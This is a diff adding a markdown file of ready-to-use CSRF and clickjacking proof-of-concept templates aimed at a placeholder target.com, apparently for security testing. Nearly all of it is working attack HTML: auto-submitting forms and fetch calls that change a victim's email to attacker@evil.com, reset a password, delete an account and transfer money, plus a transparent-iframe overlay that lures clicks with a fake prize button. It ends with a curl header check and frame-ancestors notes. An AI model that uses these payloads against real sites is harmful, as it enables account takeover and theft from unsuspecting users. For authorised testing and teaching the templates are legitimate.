@@ -1,0 +1,115 @@
+# CSRF PoC Templates (replace with real values)
+
+## 1. GET-based CSRF (auto image load)
+```html
+<html>
+<body>
+<img src="https://target.com/account/delete?id=123">
+</body>
+</html>
+```
+
+## 2. POST-based CSRF (auto-submit form)
+```html
+<html>
+<body>
+<form action="https://target.com/account/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>document.forms[0].submit()</script>
+</body>
+</html>
+```
+
+## 3. JSON content-type CSRF (fetch + no-cors)
+```html
+<html>
+<body>
+<script>
+fetch('https://target.com/api/user/update', {
+  method: 'POST',
+  mode: 'no-cors',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({email: 'attacker@evil.com'})
+})
+</script>
+</body>
+</html>
+```
+(If the API ignores the wrong content-type and processes the change → still CSRF.)
+
+## 4. Multi-field + CSRF via form charset trick (bypass JSON filter)
+```html
+<form action="https://target.com/api/update" method="POST" enctype="text/plain">
+  <input type="hidden" name='{"email":"attacker@evil.com","ignored":"' value='"}'>
+</form>
+```
+(Some frameworks read the JSON-looking body.)
+
+## 5. GET CSRF via top-level navigation (works if SameSite=Lax treats top-level GET as allowed)
+```html
+<a href="https://target.com/logout">Logout CSRF</a>
+```
+
+## 6. CSRF against password change (parallel)
+```html
+<form action="https://target.com/account/password" method="POST">
+  <input name="current_pw"  value="known-or-empty">
+  <input name="new_pw"      value="pwned123">
+  <input name="confirm_pw"  value="pwned123">
+</form>
+<script>document.forms[0].submit()</script>
+```
+(Send both current-unknown cases — many apps skip re-auth.)
+
+## 7. JS fetch with credentials (same-origin cookie auth)
+```html
+<script>
+fetch('https://target.com/account/transfer', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'amount=1000&to=attacker'
+})
+</script>
+```
+
+---
+
+# Clickjacking
+
+## Frame test
+```html
+<html>
+<body>
+<iframe src="https://target.com/account" width="900" height="600"></iframe>
+</body>
+</html>
+```
+If the page renders inside the frame → clickjacking possible.
+
+## Full 2D "transparent overlay" PoC
+```html
+<html>
+<head><style>
+  .victim { position:absolute; opacity:0.0001; z-index:2; }
+  .bait   { position:absolute; z-index:1; }
+</style></head>
+<body>
+<button class="bait" style="top:120px;left:60px">Click for a prize!</button>
+<iframe class="victim" src="https://target.com/account" width="900" height="600"></iframe>
+</body>
+</html>
+```
+
+## Header-check curl
+```bash
+curl -sI https://target.com/account | grep -iE "x-frame-options|csp"
+# Missing both → report
+```
+CSP present but wrong form:
+```
+Content-Security-Policy: frame-ancestors 'self'          → only self can frame → safe
+Content-Security-Policy: frame-ancestors *               → VULNERABLE
+X-Frame-Options: ALLOW-FROM <attacker>                    → VULNERABLE (deprecated, ignored)
+```
